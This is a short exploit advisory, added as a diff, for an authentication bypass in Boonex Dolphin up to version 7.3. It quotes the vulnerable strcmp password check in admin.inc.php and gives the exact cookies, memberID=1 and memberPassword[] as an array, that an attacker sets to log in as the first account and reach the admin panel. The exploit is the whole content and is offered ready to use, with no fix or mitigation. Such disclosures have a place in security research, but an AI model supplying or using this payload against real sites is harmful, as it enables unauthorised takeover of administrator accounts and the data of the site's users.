@@ -1,0 +1,24 @@
+# Exploit Title     : Boonex Dolphin all versoin <= 7.3 Authentication Bypass
+# Exploit Author    : Saadat Ullah saadi_linux[@]rocketmail.com
+# Software Link     : https://www.boonex.com
+# Author HomePage   : http://security-geeks.blogspot.com
+ 
+
+Proof of Concept
+
+File: admin.inc.php
+Line: 187
+Code: (strcmp($aProfile['Password'], $passwd) != 0)
+ 
+$passwd is equal to Cookie parameter memberpassword
+ 
+Bug:
+According to PHP documentation strcmp will compare strings, but what if we provide an array???
+ 
+So, simple bypass is to put two cookies in browser
+memberID=1
+memberPassword[]=blah --->array
+ 
+This will allow the attacker to bypass the authentication and can also enter in admin panel.
+ 
+#Independent Pakistani Security Researcher
